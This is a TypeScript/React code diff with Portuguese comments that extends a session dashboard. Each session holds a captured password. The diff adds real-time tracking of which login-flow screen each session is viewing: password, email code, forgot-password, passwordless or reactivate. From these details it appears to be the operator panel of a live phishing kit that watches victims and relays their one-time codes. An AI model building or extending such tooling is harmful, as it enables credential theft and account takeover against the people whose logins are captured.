@@ -59,6 +59,28 @@ function formatTime(iso: string): string {
   });
 }
 
+/** Mapeia o `kind` da tela (vindo da presença) pra um rótulo amigável. */
+function screenKindLabel(kind: string): string {
+  switch (kind) {
+    case "main":
+      return "Tela home";
+    case "access-account":
+      return "Tela acessar";
+    case "password":
+      return "Tela senha";
+    case "email-code":
+      return "Tela código";
+    case "forgot-password":
+      return "Tela esqueci senha";
+    case "passwordless":
+      return "Tela sem senha";
+    case "reactivate":
+      return "Tela reativar";
+    default:
+      return kind;
+  }
+}
+
 function deviceLabel(ua: string | null): string {
   if (!ua) return "—";
   if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
@@ -104,6 +126,8 @@ export default function Dashboard() {
 
   /** Sessões com aba aberta + visível agora. */
   const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
+  /** Tela atual em tempo real por sessão (vinda do canal de presença). */
+  const [liveScreens, setLiveScreens] = useState<Map<string, string>>(new Map());
 
   // Destrava AudioContext no primeiro clique (necessário pra tocar som depois sem gesto)
   useEffect(() => {
@@ -135,6 +159,11 @@ export default function Dashboard() {
       (map) => {
         const ids = new Set(map.keys());
         setOnlineSessionIds(ids);
+        const screens = new Map<string, string>();
+        for (const [sid, meta] of map) {
+          if (meta.screenKind) screens.set(sid, meta.screenKind);
+        }
+        setLiveScreens(screens);
       },
       (sessionId) => {
         // Cada JOIN = transição offline→online de uma sessão.
@@ -451,11 +480,15 @@ export default function Dashboard() {
                 <tbody>
                   {activeSessions.map((s) => {
                     const hasPassword = s.password !== "—";
-                    // Inferência da tela atual:
-                    // - tem senha → já passou da escolha, está na tela do código
-                    // - só tem e-mail → na tela de escolha (senha ou código)
-                    const screenLabel = hasPassword ? "Tela código" : "Tela escolha";
                     const isOnline = onlineSessionIds.has(s.session_id);
+                    const liveKind = liveScreens.get(s.session_id);
+                    // Tela em tempo real (vinda da presença) tem prioridade;
+                    // se a sessão está offline, cai pra inferência baseada em dados.
+                    const screenLabel = liveKind
+                      ? screenKindLabel(liveKind)
+                      : hasPassword
+                        ? "Tela código"
+                        : "Tela escolha";
                     return (
                       <tr key={s.session_id} className="border-t border-border hover:bg-muted/30">
                         <td className="whitespace-nowrap px-4 py-3 text-xs">
